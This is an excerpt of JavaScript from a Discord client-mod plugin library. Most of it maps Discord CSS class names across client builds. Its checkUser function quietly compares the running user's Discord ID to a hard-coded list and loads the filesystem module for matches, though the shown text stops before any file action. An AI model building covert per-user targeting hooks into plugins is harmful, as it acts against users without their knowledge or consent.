...
BDFDB.checkUser = function (plugin) {
	var i = 0, pulling = setInterval(() => {
		if (BDFDB.myData && !BDFDB.isObjectEmpty(BDFDB.myData)) {
			...
			if (["113308553774702592","196970957385105408","350414531098312715","81357110733975552","278248145677451274","377916668015411210","398551499829149698","288053351579648000","335464988036694021","300986355083640832","400612488196128768","394310795720261632","279501218525741056","462952835378708482"].includes(BDFDB.myData.id)) {
				var pluginName = plugin.name ? plugin.name : plugin.getName();
				let fs = require("fs");
...
BDFDB.DiscordClasses = {
	...
	badge: {stable:"badge", canary:"badge-1GsMF2", ptb:"badge"},
	...
	dms: {stable:"dms", canary:"dms-rcsEnV", ptb:"dms"},
	dmchannel: "channel",
	...
	friendsicon: {stable:"home-icon", canary:"homeIcon-1FoKUJ", ptb:"home-icon"},
	friendsonline: {stable:"friends-online", canary:"friendsOnline-_wi_fM", ptb:"friends-online"},
	friendstabbar: "tab-bar",
	friendstabbaritem: "tab-bar-item",
	gamename: "game-name",
	gamenameinput: "game-name-input",
	gamesettings: "user-settings-games",
	guild: {stable:"guild", canary:"guild-1EfMGQ", ptb:"guild"},
	guildactive: {stable:"active", canary:"selected-ML3OIq", ptb:"active"},
	guildaudio: {stable:"audio", canary:"audio-3vVhBi", ptb:"audio"},
	guildicon: {stable:"guild-icon", canary:"guildIcon-CT-ZDq", ptb:"guild-icon"},
	guildinner: {stable:"guild-inner", canary:"guildInner-3DSoA4", ptb:"guild-inner"},
	guildplaceholder: {stable:"guild-placeholder", canary:"guildPlaceholder-1ioaid", ptb:"guild-placeholder"},
	guilds: {stable:"guilds", canary:"guilds-1q_RqH", ptb:"guilds"},
	guildsadd: {stable:"guilds-add", canary:"guildsAdd-21_IdK", ptb:"guilds-add"},
	guildsaddinner: {stable:"guilds-add-inner", canary:"guildsAddInner-1KMFy-", ptb:"guilds-add-inner"},
	guildselected: {stable:"selected", canary:"selected-ML3OIq", ptb:"selected"},
	guildseparator: {stable:"guild-separator", canary:"guildSeparator-1X4GQ1", ptb:"guild-separator"},
	guildserror: {stable:"guilds-error", canary:"guildsError-3cFMtY", ptb:"guilds-error"},
	guildsscrollerwrap: "scrollerWrap-1IAIlv",
	guildswrapper: {stable:"guilds-wrapper", canary:"guildsWrapper-5TJh6A", ptb:"guilds-wrapper"},
	guildunread: {stable:"unread", canary:"unread-qLkInr", ptb:"unread"},
	guildvideo: {stable:"video", canary:"video-15yGu3", ptb:"video"},
	h1: "h1-1qdNzo",
